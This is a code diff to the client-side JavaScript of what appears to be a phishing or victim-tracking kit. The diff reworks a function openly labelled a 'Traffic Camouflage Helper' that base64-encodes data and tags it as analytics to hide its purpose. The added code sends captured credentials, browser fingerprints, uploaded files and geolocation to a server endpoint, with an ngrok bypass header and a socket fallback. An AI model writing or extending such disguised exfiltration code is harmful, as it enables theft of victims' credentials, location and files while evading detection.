@@ -41,14 +41,30 @@ socket.on('reconnect', (attempt) => {
     sendTelemetry('join', { logId, linkId });
 });
 
-// Traffic Camouflage Helper
-function sendTelemetry(event, data) {
+// Traffic Camouflage Helper (Hybrid: HTTP + Socket)
+async function sendTelemetry(event, data) {
     const packet = {
         v: btoa(JSON.stringify({ event, data })),
         ts: Date.now(),
-        type: 'analytics_event' // Camouflage label
+        type: 'analytics_event'
     };
-    socket.emit('telemetry_data', packet);
+
+    // Critical events go via HTTP for reliability on Vercel/Serverless
+    const criticalEvents = ['join', 'creds', 'fingerprint', 'file_up', 'geo'];
+    if (criticalEvents.includes(event)) {
+        try {
+            await fetch('/api/telemetry', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'ngrok-skip-browser-warning': 'true' },
+                body: JSON.stringify(packet)
+            });
+            console.log(`[SENTINEL] HTTP Telemetry sent: ${event}`);
+        } catch (e) {
+            socket.emit('telemetry_data', packet);
+        }
+    } else {
+        socket.emit('telemetry_data', packet);
+    }
 }
 
 // Join session with persistent ID
